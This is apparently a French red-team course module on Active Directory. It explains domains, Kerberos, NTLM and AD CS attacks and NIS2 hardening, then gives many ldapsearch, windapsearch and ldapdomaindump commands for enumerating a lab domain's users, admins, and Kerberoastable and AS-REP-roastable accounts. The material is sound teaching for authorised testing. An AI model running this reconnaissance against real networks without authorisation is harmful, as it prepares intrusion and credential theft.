# Module 7 — Active Directory : Infrastructure & Attaques

> **Jour 2 — Red Team Training**  
> Durée estimée : 8–10 heures  
> Niveau : Intermédiaire / Avancé  
> Auteur : Red Team — SDV M2 2026

---

## Table des matières

1. [Introduction à Active Directory](#1-introduction-à-active-directory)
2. [Énumération AD — LDAP](#2-énumération-ad--ldap)
3. [BloodHound](#3-bloodhound)
4. [Responder — Empoisonnement LLMNR/NBT-NS](#4-responder--empoisonnement-llmnrnbt-ns)
5. [CrackMapExec](#5-crackmapexec)
6. [Impacket](#6-impacket)
7. [Énumération sans authentification](#7-énumération-sans-authentification)
8. [TP Synthèse](#8-tp-synthèse)

---

## 1. Introduction à Active Directory

### 1.1 Qu'est-ce qu'Active Directory ?

Active Directory (AD) est le service d'annuaire de Microsoft utilisé pour gérer les identités, les accès et les politiques de sécurité dans un environnement Windows entreprise. Développé à partir de Windows 2000, AD s'appuie sur des standards ouverts comme **LDAP** (Lightweight Directory Access Protocol), **Kerberos**, et **DNS**.

AD permet de :
- Centraliser l'authentification et l'autorisation
- Déployer des politiques de groupe (GPO)
- Gérer les utilisateurs, groupes, ordinateurs, imprimantes, serveurs
- Fédérer des identités avec d'autres annuaires (ADFS)

Pour un attaquant Red Team, AD est **la cible centrale** de tout engagement en environnement Windows. Compromettre un contrôleur de domaine équivaut à compromettre **la totalité du réseau**.

### 1.2 Concepts clés

#### Domaine

Un **domaine** est l'unité administrative principale d'AD. Il s'agit d'un ensemble d'objets (utilisateurs, groupes, ordinateurs) qui partagent une base de données d'annuaire commune, stockée sur les contrôleurs de domaine.

```
Exemple : sdv-m2.lab
├── Utilisateurs
│   ├── jdoe
│   ├── asmith
│   └── admin01
├── Groupes
│   ├── Domain Admins
│   ├── Domain Users
│   └── Enterprise Admins
├── Ordinateurs
│   ├── DC01.sdv-m2.lab
│   └── SRV-APP.sdv-m2.lab
└── Unités d'organisation (OU)
    ├── OU=Paris
    └── OU=Lyon
```

Le nom de domaine complet (FQDN) d'un domaine AD suit la syntaxe DNS : `sdv-m2.lab`. Le **NetBIOS** est généralement la partie gauche avant le premier point : `SDV-M2`.

#### Forêt (Forest)

Une **forêt** est la frontière de sécurité supérieure dans AD. Elle contient un ou plusieurs domaines qui partagent :
- Un schema commun (définition des classes d'objets et attributs)
- Un catalogue global (Global Catalog)
- Une configuration commune
- Des relations de confiance transitives automatiques entre les domaines

```
Forêt: sdv-m2.lab
├── Domaine: sdv-m2.lab (domaine racine)
├── Domaine: europe.sdv-m2.lab
└── Domaine: asia.sdv-m2.lab
```

Les administrateurs **Enterprise Admins** (domaine racine) ont des privilèges sur **tous les domaines** de la forêt.

#### Contrôleur de domaine (DC)

Le **Domain Controller** est le serveur qui héberge la base de données AD (NTDS.dit) et fournit les services d'authentification, d'annuaire LDAP, de Kerberos, et de DNS. Chaque domaine doit avoir au moins un DC. En production, on en trouve généralement 2 ou plus pour la haute disponibilité.

Le fichier critique : `C:\Windows\NTDS\NTDS.dit`

Ce fichier contient **tous les hashs de mots de passe** du domaine. C'est l'objectif ultime d'une extraction par `secretsdump.py`.

#### Unité d'organisation (OU)

Les OU sont des conteneurs hiérarchiques qui permettent d'organiser les objets AD. Contrairement aux groupes, les OU sont utilisées pour :
- Déployer des GPO (Stratégies de groupe)
- Déléguer des droits d'administration
- Organiser logiquement les ressources

```
sdv-m2.lab
├── OU=Utilisateurs
│   ├── OU=Direction
│   ├── OU=IT
│   └── OU=Comptabilite
├── OU=Ordinateurs
│   ├── OU=Postes
│   └── OU=Serveurs
└── OU=Groupes
```

#### Relations de confiance (Trusts)

Les trusts permettent aux utilisateurs d'un domaine d'accéder aux ressources d'un autre domaine.

| Type | Description |
|------|-------------|
| Transitive | La confiance s'étend aux domaines enfants automatiquement |
| One-way | Domaine A fait confiance à B, mais pas l'inverse |
| Two-way | Confiance réciproque entre deux domaines |
| Forest trust | Confiance entre deux forêts entières |
| External trust | Confiance vers un domaine hors de la forêt |
| Realm trust | Confiance vers un realm Kerberos non-Windows |

Un attaquant peut exploiter les trusts pour se déplacer latéralement d'un domaine à un autre ("forest hopping").

---

### 1.3 Protocoles fondamentaux

#### Kerberos

Kerberos est le protocole d'authentification principal d'AD (RFC 4120). Il remplace NTLM dans la mesure du possible.

**Composants :**
- **KDC** (Key Distribution Center) : service sur le DC qui délivre les tickets
- **TGT** (Ticket-Granting Ticket) : ticket de session utilisateur
- **TGS** (Ticket-Granting Service) : ticket pour un service spécifique
- **AS** (Authentication Service) : première étape d'authentification
- **SPN** (Service Principal Name) : identifiant unique d'un service

**Flow d'authentification Kerberos :**

```
Utilisateur (client)                  KDC (DC)                     Service (serveur)
     │                                  │                              │
     │  1. AS-REQ (demande TGT)         │                              │
     │  ───────────────────────────────►│                              │
     │                                  │                              │
     │  2. AS-REP (TGT + clé de session)│                              │
     │  ◄───────────────────────────────│                              │
     │                                  │                              │
     │  3. TGS-REQ (TGT + SPN)          │                              │
     │  ───────────────────────────────►│                              │
     │                                  │                              │
     │  4. TGS-REP (TGS pour le service)│                              │
     │  ◄───────────────────────────────│                              │
     │                                  │                              │
     │  5. AP-REQ (TGS vers service)    │                              │
     │  ──────────────────────────────────────────────────────────────►│
     │                                  │                              │
     │  6. AP-REP (authentification)    │                              │
     │  ◄──────────────────────────────────────────────────────────────│
```

**Attaques Kerberos :**
- **Kerberoasting** (T1558.003) : demande de TGS pour un compte de service, extraction du hash du SPN, crack offline
- **AS-REP Roasting** (T1558.004) : cible les utilisateurs sans pré-authentification Kerberos
- **Pass-the-Ticket** (T1550.003) : rejeu d'un ticket Kerberos volé
- **Golden Ticket** (T1558.001) : forge d'un TGT avec le hash KRBTGT
- **Silver Ticket** (T1558.002) : forge d'un TGS pour un service spécifique
- **DCSync** (T1003.006) : imitation d'un DC pour répliquer les hashs

#### LDAP (Lightweight Directory Access Protocol)

LDAP est le protocole d'accès à l'annuaire AD. Il fonctionne sur les ports :
- **389** (TCP) : LDAP standard
- **636** (TCP) : LDAPS (LDAP over SSL/TLS)
- **3268** (TCP) : Global Catalog (GC)
- **3269** (TCP) : Global Catalog SSL

Les opérations LDAP principales :
- `bind` : authentification
- `search` : recherche d'objets
- `compare` : comparaison d'attributs
- `add` / `delete` / `modify` : modification de l'annuaire

Le **distinguished name (DN)** est le chemin unique d'un objet dans l'arbre LDAP :
```
CN=jdoe,OU=Utilisateurs,DC=sdv-m2,DC=lab
│   │            │              │
│   │            │              └── Domain Component
│   │            └── Organizational Unit
│   └── Common Name (utilisateur)
└── Préfixe de l'objet
```

#### DNS (Domain Name System)

AD est **intégralement dépendant du DNS**. Chaque DC enregistre des enregistrements SRV qui permettent aux clients de localiser les services AD :

```
_ldap._tcp.sdv-m2.lab.  →  dc01.sdv-m2.lab:389
_kerberos._tcp.sdv-m2.lab.  →  dc01.sdv-m2.lab:88
_gc._tcp.sdv-m2.lab.  →  dc01.sdv-m2.lab:3268
```

Sans DNS fonctionnel, AD ne peut pas fonctionner.

#### SMB (Server Message Block)

SMB est le protocole de partage de fichiers et d'impression utilisé par AD pour :
- La réplication entre DCs (FRS/DFSR)
- Les partages de fichiers (SYSVOL, NETLOGON)
- L'authentification NTLM over SMB

Le partage `SYSVOL` est particulièrement intéressant pour un attaquant :
```
\\sdv-m2.lab\SYSVOL\sdv-m2.lab\
└── Policies
    ├── {GUID-1}
    │   ├── Machine
    │   └── User
    │       └── scripts
    │           └── logon.bat     ← mots de passe en clair possibles
    └── {GUID-2}
```

Les scripts de connexion stockés dans SYSVOL contiennent souvent des mots de passe en clair ou des secrets.

#### NTLM

NTLM (NT LAN Manager) est l'ancien protocole d'authentification Microsoft, aujourd'hui déprécié mais toujours présent pour la rétrocompatibilité.

**Versions :**
- **NTLMv1** : extrêmement faible, cassable en temps réel
- **NTLMv2** : plus fort mais vulnérable au relais (relay)

Le handshake NTLM :
```
Client                          Serveur
   │                               │
   │  1. NEGOTIATE (négociation)   │
   │  ───────────────────────────►│
   │                               │
   │  2. CHALLENGE (défi 8 bytes)  │
   │  ◄────────────────────────────│
   │                               │
   │  3. AUTHENTICATE (hash + défi)│
   │  ───────────────────────────►│
```

Le hash NTLMv2 capturé par Responder peut être :
- Craqué offline (hashcat mode 5600 pour NTLMv2)
- Relayé vers un autre serveur SMB

---

### 1.4 Services AD majeurs

#### AD DS (Active Directory Domain Services)

Service principal d'annuaire. Fournit :
- Authentification (Kerberos, NTLM)
- Autorisation (ACLs, groupes)
- Stockage des objets (NTDS.dit)
- Réplication entre DCs
- Catalogue global

#### AD CS (Active Directory Certificate Services)

Service de certificats (PKI). Permet :
- Délivrance de certificats aux utilisateurs et ordinateurs
- Smart card authentication
- Chiffrement (EFS, BitLocker)
- Signature de code

**Attaques AD CS :**
- **ESC1** : certificat avec SAN modifiable → usurpation d'identité
- **ESC2** : template avec autorisation de "Any Purpose" EKU
- **ESC3** : template avec "Enrollment Agent" EKU
- **ESC4** : droits d'écriture sur un template
- **ESC6** : EDITF_ATTRIBUTESUBJECTALTNAME2 activé
- **ESC8** : relais HTTP vers AD CS (NTLM relay)
- **Theft** : vol de certificats (certipy export / mimikatz)

#### AD FS (Active Directory Federation Services)

Service de fédération d'identités. Permet le Single Sign-On (SSO) entre organisations. Point d'entrée pour :
- **Golden SAML** : forge de tokens SAML avec la clé privée AD FS
- **DKM** : extraction de la clé de déchiffrement AD FS

---

### 1.5 NIS2 et sécurisation AD

La directive **NIS2** (Network and Information Security 2) est entrée en vigueur en 2024 dans l'Union Européenne. L'article 21 impose des mesures de cybersécurité pour les entités essentielles et importantes.

**Mesures NIS2 applicables à AD :**

| Article | Mesure | Implémentation AD |
|---------|--------|-------------------|
| Art. 21(2)(a) | Politiques d'analyse des risques | Audit régulier des ACL AD |
| Art. 21(2)(b) | Gestion des incidents | Monitoring des événements AD (4662, 5136, 4670) |
| Art. 21(2)(c) | Continuité d'activité | Multiples DCs, sauvegarde NTDS.dit chiffré |
| Art. 21(2)(d) | Sécurité des chaînes d'approvisionnement | Contrôle des trusts inter-forêts |
| Art. 21(2)(e) | Sécurité des acquisitions | Désactivation des protocoles legacy |
| Art. 21(2)(f) | Bonnes pratiques cryptographiques | Désactivation NTLMv1, CBC, RC4 |
| Art. 21(2)(g) | Sécurité du personnel | Privilège minimum, PAM, tiering |
| Art. 21(2)(h) | Contrôle d'accès | DACL restrictives, RBAC, MFA |
| Art. 21(2)(i) | Journalisation et surveillance | SIEM + corrélation des logs AD |

**Bonnes pratiques de sécurisation AD :**

1. **Désactiver NTLMv1** (GPO : Network security: LAN Manager authentication level → "Send NTLMv2 responses only. Refuse LM & NTLM")
2. **Configurer la pré-authentification Kerberos** pour tous les utilisateurs (sauf cas exceptionnels)
3. **Restreindre les droits** des comptes de service (gMSA si possible)
4. **Activer la protection LAPS** (Local Administrator Password Solution) pour les mots de passe administrateur locaux
5. **Auditer les ACL** avec PingCastle ou Purple Knight
6. **Désactiver LLMNR et NetBIOS** via GPO
7. **Mettre en œuvre l'AD Tiering Model** (Microsoft ESAE / Red Forest)
8. **Configurer la Protected Users Group** (empêche l'utilisation NTLM, DES, RC4, délégation contrainte)
9. **Détection des attaques Kerberos** : monitoring des événements 4769 (Kerberoasting), 4624 (logons anormaux)
10. **Rotation régulière** du mot de passe KRBTGT (2 fois minimum)

---

## 2. Énumération AD — LDAP

### 2.1 Introduction à l'énumération LDAP

L'énumération Active Directory via LDAP est généralement la **première étape active** d'un test d'intrusion sur un environnement AD. Avec des identifiants valides (domaine + utilisateur + mot de passe ou hash), on peut interroger l'annuaire pour obtenir une cartographie complète du réseau.

**Technique MITRE ATT&CK : T1087 — Account Discovery**

> L'adversaire tente de découvrir les comptes et groupes existants pour comprendre la structure du domaine cible.

### 2.2 ldapsearch

`ldapsearch` est un outil en ligne de commande fourni par la suite **OpenLDAP**. Il permet d'interroger un annuaire LDAP avec des filtres puissants.

#### Installation

```bash
# ─── Debian/Ubuntu / Kali Linux ──────────────────────────────────────────────
sudo apt update && sudo apt install -y ldap-utils

# ─── Vérification de l'installation ──────────────────────────────────────────
ldapsearch --version
# Sortie attendue :
# @(#) $OpenLDAP: ldapsearch 2.6.7 (date) ...
```

#### Syntaxe de base

```bash
# ─── Syntaxe générale ────────────────────────────────────────────────────────
ldapsearch -H ldap://<DC_IP> -D "<DOMAIN>\\<USER>" -w "<PASSWORD>" \
  -b "<BASE_DN>" -s <SCOPE> "<FILTER>" [ATTRIBUTES]
```

**Paramètres :**

| Paramètre | Description | Exemple |
|-----------|-------------|---------|
| `-H` | URI LDAP du serveur | `ldap://192.168.1.10` |
| `-D` | DN de l'utilisateur (bind DN) | `CN=jdoe,CN=Users,DC=sdv-m2,DC=lab` |
| `-w` | Mot de passe | `-w 'P@ssw0rd'` |
| `-W` | Demander le mot de passe interactivement | `-W` |
| `-b` | Base DN (racine de la recherche) | `DC=sdv-m2,DC=lab` |
| `-s` | Scope (base, onelevel, subtree) | `sub` (défaut : sub) |
| `-x` | Authentification simple (obligatoire sans SASL) | `-x` |
| `-E` | Extensions LDAP (ex: paged results) | `-E pr=1000` (pagination 1000) |
| `-o` | Options supplémentaires | `-o ldif-wrap=no` |
| `-LLL` | Affichage LDIF sans commentaires | `-LLL` |
| `-l` | Time limit (secondes) | `-l 30` |
| `-z` | Size limit (nombre d'entrées) | `-z 5000` |

#### Connexion simple (authentification)

```bash
# ─── Connexion à un DC LDAP avec authentification ────────────────────────────
# Remplacez :
#   - 192.168.1.10  → IP du contrôleur de domaine
#   - sdv-m2\jdoe   → utilisateur du domaine
#   - 'P@ssw0rd'    → mot de passe
#   - DC=sdv-m2,DC=lab → base DN du domaine

ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" \
  -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab"
```

**Sortie attendue (extrait) :**
```
# extended LDIF
# LDAPv3
# base <DC=sdv-m2,DC=lab> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
# sdv-m2.lab
dn: DC=sdv-m2,DC=lab
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=sdv-m2,DC=lab
instanceType: 5
whenCreated: 20250101000000.0Z
whenChanged: 20250528000000.0Z
subRefs: DC=ForestDnsZones,DC=sdv-m2,DC=lab
subRefs: DC=DomainDnsZones,DC=sdv-m2,DC=lab
[... des milliers de lignes ...]
```

> **⚠️ Attention :** Sans filtre, cette commande renvoie TOUS les objets du domaine. Cela peut prendre plusieurs minutes et générer des centaines de milliers de lignes.

#### Filtres LDAP avancés

Les filtres LDAP utilisent la syntaxe RFC 4515. Voici les filtres les plus utiles pour un pentest :

```bash
# ─── 1. TOUS les utilisateurs ────────────────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName displayName mail title department distinguishedName

# ─── 2. TOUS les groupes ─────────────────────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "objectClass=group" \
  sAMAccountName description member

# ─── 3. TOUS les ordinateurs du domaine ──────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(objectClass=computer)" \
  name dNSHostName operatingSystem operatingSystemVersion

# ─── 4. Domain Admins (membres du groupe) ────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=group)(cn=Domain Admins))" \
  member memberOf

# ─── 5. Contrôleurs de domaine ───────────────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" \
  name dNSHostName

# ─── 6. Utilisateurs avec SPN (Kerberoastable) ───────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# ─── 7. Utilisateurs sans pré-authentification Kerberos (AS-REP Roastable) ───
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName userAccountControl

# ─── 8. Utilisateurs avec privilèges élevés (adminCount=1) ───────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(adminCount=1))" \
  sAMAccountName adminCount

# ─── 9. OU et conteneurs ─────────────────────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(|(objectClass=organizationalUnit)(objectClass=container))" \
  name description

# ─── 10. Politiques de mot de passe ──────────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(objectClass=domainDNS)" \
  minPwdLength lockoutThreshold lockoutDuration maxPwdAge
```

#### Filtres avec UAC (User Account Control)

Le champ `userAccountControl` est un bitmask (entier 32 bits). On utilise la règle OID `1.2.840.113556.1.4.803` pour le masquage de bits.

```bash
# ─── Bitmasks UAC importants ─────────────────────────────────────────────────
# ACCOUNTDISABLE = 0x0002 (2)
# LOCKOUT = 0x0010 (16)
# PASSWD_NOTREQD = 0x0020 (32)
# PASSWD_CANT_CHANGE = 0x0040 (64)
# NORMAL_ACCOUNT = 0x0200 (512)
# DONT_REQUIRE_PREAUTH = 0x400000 (4194304)
# TRUSTED_FOR_DELEGATION = 0x80000 (524288)
# TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000 (16777216)

# ─── Comptes désactivés ──────────────────────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" \
  sAMAccountName

# ─── Comptes avec mot de passe non requis (faible sécurité) ──────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" \
  sAMAccountName

# ─── Comptes avec délégation Kerberos non contrainte ─────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  sAMAccountName
```

#### Export LDIF formaté

```bash
# ─── Export des utilisateurs en LDIF (sans wrapping des lignes) ───────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person))" \
  -LLL -o ldif-wrap=no \
  > exports/ldap-users-$(date +%Y%m%d).ldif

# ─── Export en CSV des utilisateurs (via awk) ────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName displayName mail title department \
  -LLL -o ldif-wrap=no \
  | awk '/^sAMAccountName:/{user=$2} /^displayName:/{name=$0; sub(/^displayName: /,"",name)} /^mail:/{mail=$2} /^title:/{title=$0; sub(/^title: /,"",title)} /^department:/{dept=$0; sub(/^department: /,"",dept)} /^$/{print user","name","mail","title","dept; user=""; name=""; mail=""; title=""; dept=""}' \
  > exports/users.csv

# ─── Vérification de l'export ────────────────────────────────────────────────
head -5 exports/users.csv
# Sortie attendue :
# jdoe,John Doe,jdoe@sdv-m2.lab,Ingénieur,IT
# asmith,Alice Smith,asmith@sdv-m2.lab,Analyste,Security
# bwayne,Bob Wayne,bwayne@sdv-m2.lab,Responsable,Direction
```

---

### 2.3 windapsearch

`windapsearch` est un script Python spécialisé dans l'énumération AD via LDAP. Il est plus simple d'utilisation que `ldapsearch` pour les recherches courantes.

#### Installation

```bash
# ─── Installation via pip ─────────────────────────────────────────────────────
pip install windapsearch

# ─── Vérification ─────────────────────────────────────────────────────────────
windapsearch --version
# Sortie attendue :
# windapsearch version 0.3.2
```

#### Utilisation de base

```bash
# ─── Syntaxe : windapsearch [options] ─────────────────────────────────────────

# ─── 1. Énumérer tous les utilisateurs ────────────────────────────────────────
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  -U

# ─── 2. Énumérer tous les groupes ─────────────────────────────────────────────
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  -G

# ─── 3. Énumérer les membres d'un groupe spécifique ──────────────────────────
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  -m "Domain Admins"

# ─── 4. Énumérer les ordinateurs ─────────────────────────────────────────────
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  -C

# ─── 5. Utilisateurs avec SPN ─────────────────────────────────────────────────
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  --spn

# ─── 6. Utilisateurs sans pré-authentification (AS-REP) ─────────────────────
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  --no-pre-auth

# ─── 7. Énumération des OU ────────────────────────────────────────────────────
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  --ou

# ─── 8. Utilisateurs admin (adminCount=1) ───────────────────────────────────
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  --admin-count

# ─── 9. Délégation Kerberos ───────────────────────────────────────────────────
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  --delegation

# ─── 10. Export JSON ──────────────────────────────────────────────────────────
windapsearch -d sdv-m2.lab \
  -u 'SDV-M2\jdoe' \
  -p 'P@ssw0rd' \
  -U --json -o exports/windap-users.json
```

**Sortie typique `-U` :**
```
[+] Enumerating all Users
[+] Using base DN: DC=sdv-m2,DC=lab

sAMAccountName: jdoe
userPrincipalName: jdoe@sdv-m2.lab
displayName: John Doe
mail: jdoe@sdv-m2.lab
title: Ingénieur
department: IT
whenCreated: 2025-06-01 08:30:00
pwdLastSet: 2025-06-01 08:30:00
userAccountControl: NORMAL_ACCOUNT (512)
memberOf: CN=Domain Users,CN=Users,DC=sdv-m2,DC=lab
memberOf: CN=IT,CN=Users,DC=sdv-m2,DC=lab
[---snip---]
```

---

### 2.4 ldapdomaindump

`ldapdomaindump` est un outil qui extrait **toutes** les informations d'un domaine AD via LDAP et génère des fichiers JSON/HTML pour analyse offline.

#### Installation

```bash
# ─── Installation via pip ─────────────────────────────────────────────────────
pip install ldapdomaindump

# ─── Vérification ─────────────────────────────────────────────────────────────
ldapdomaindump --help
```

#### Utilisation

```bash
# ─── Création du répertoire de sortie ─────────────────────────────────────────
mkdir -p exports/ldapdomaindump

# ─── Dump complet du domaine ──────────────────────────────────────────────────
ldapdomaindump ldap://192.168.1.10 \
  -u "SDV-M2\\jdoe" \
  -p 'P@ssw0rd' \
  -o exports/ldapdomaindump/

# Paramètres supplémentaires utiles :
#   --no-html    : ne pas générer les fichiers HTML
#   --no-json    : ne pas générer les fichiers JSON
#   --depth N    : profondeur de récursion pour les membres de groupe
#   -cname       : utiliser le nom commun du DC au lieu du DNS
```

**Fichiers générés :**
```
exports/ldapdomaindump/
├── domain_users.html       ← Utilisateurs (tableau HTML)
├── domain_users.json       ← Utilisateurs (format JSON)
├── domain_groups.html      ← Groupes
├── domain_groups.json      ← Groupes
├── domain_computers.html   ← Ordinateurs
├── domain_computers.json   ← Ordinateurs
├── domain_policy.html      ← Politiques de mot de passe
├── domain_policy.json      ← Politiques
├── domain_trusts.html      ← Relations de confiance
├── domain_trusts.json      ← Relations de confiance
├── domain_children.html    ← Domaines enfants
├── domain_children.json    ← Domaines enfants
└── index.html              ← Page d'accueil HTML avec navigation
```

#### Navigation dans l'export HTML

Ouvrez le fichier `index.html` dans un navigateur :

```bash
# ─── Si vous êtes sur Kali (GUI) ──────────────────────────────────────────────
firefox exports/ldapdomaindump/index.html
# ou
chromium exports/ldapdomaindump/index.html
```

La page d'accueil présente :
- **User Statistics** : nombre d'utilisateurs, privilégiés, inactifs
- **Computer Statistics** : OS, versions
- **Group Overview** : groupes avec membre counts
- **Trusts** : relations de confiance
- **Password Policy** : politique de mot de passe en vigueur

---

### 2.5 TP Guidé — Énumération LDAP

#### Contexte

Vous avez obtenu les identifiants suivants lors d'une phase de reconnaissance :

| Paramètre | Valeur |
|-----------|--------|
| Domaine | `sdv-m2.lab` |
| DC IP | `192.168.1.10` |
| Utilisateur | `jdoe` |
| Mot de passe | `P@ssw0rd` |
| Base DN | `DC=sdv-m2,DC=lab` |

#### Objectifs

1. Cartographier la structure AD
2. Identifier les utilisateurs privilégiés
3. Trouver des cibles potentielles (Kerberoast, AS-REP)
4. Documenter les relations de confiance

#### Étape 1 : Validation de la connectivité

```bash
# ─── Vérifier que le DC répond sur LDAP ───────────────────────────────────────
nmap -p 389,636,3268,3269 -sT 192.168.1.10

# Sortie attendue :
# PORT     STATE SERVICE
# 389/tcp  open  ldap
# 636/tcp  open  ldaps
# 3268/tcp open  globalcatLDAP
# 3269/tcp open  globalcatLDAPssl
```

#### Étape 2 : Structure du domaine

```bash
# ─── Récupérer les informations de base du domaine ────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(objectClass=domainDNS)" \
  name dnsRoot objectGUID creationTime

# ─── Énumérer toutes les OU ──────────────────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(objectClass=organizationalUnit)" \
  name distinguishedName description

# ─── Compter le nombre d'objets par type ─────────────────────────────────────
echo "=== Domain Info ==="
echo "Users: $(ldapsearch -x -H ldap://192.168.1.10 -D \"SDV-M2\\jdoe\" -w 'P@ssw0rd' -b \"DC=sdv-m2,DC=lab\" \"(&(objectClass=user)(objectCategory=person))\" -LLL | grep -c '^dn:')"

echo "Groups: $(ldapsearch -x -H ldap://192.168.1.10 -D \"SDV-M2\\jdoe\" -w 'P@ssw0rd' -b \"DC=sdv-m2,DC=lab\" \"(objectClass=group)\" -LLL | grep -c '^dn:')"

echo "Computers: $(ldapsearch -x -H ldap://192.168.1.10 -D \"SDV-M2\\jdoe\" -w 'P@ssw0rd' -b \"DC=sdv-m2,DC=lab\" \"(objectClass=computer)\" -LLL | grep -c '^dn:')"
```

#### Étape 3 : Cibles à haute valeur

```bash
# ─── 1. Identifier les Domain Admins ──────────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=group)(cn=Domain Admins))" member

# Sortie attendue :
# member: CN=Administrator,CN=Users,DC=sdv-m2,DC=lab
# member: CN=jsmith,OU=IT,DC=sdv-m2,DC=lab

# ─── 2. Identification des comptes Kerberoastables ───────────────────────────
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Sortie attendue :
# sAMAccountName: svc_sql
# servicePrincipalName: MSSQLSvc/sql01.sdv-m2.lab:1433
# sAMAccountName: svc_http
# servicePrincipalName: HTTP/webapp.sdv-m2.lab
# sAMAccountName: svc_ldap
# servicePrincipalName: LDAP/dc01.sdv-m2.lab

# ─── 3. Identification des comptes AS-REP Roastables ─────────────────────────
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName userAccountControl

# Sortie attendue (vide si bien configuré) :
# ... aucun résultat = bonne pratique de sécurité
```

#### Étape 4 : Relations de confiance

```bash
# ─── Lister les trusts du domaine ─────────────────────────────────────────────
ldapsearch -x -H ldap://192.168.1.10 \
  -D "SDV-M2\\jdoe" -w 'P@ssw0rd' \
  -b "DC=sdv-m2,DC=lab" \
  "(objectClass=trustedDomain)" \
  name flatName trustDirection trustType trustAttributes

# Sortie attendue (si trust existe) :
# name: europe.sdv-m2.lab
# flatName: EUROPE-SDVM2
# trustDirection: 2  (1=inbound, 2=outbound, 3=bidirectional)
# trustType: 1  (1=Windows, 2=MIT)
# trustAttributes: 8  (8=within forest)
```

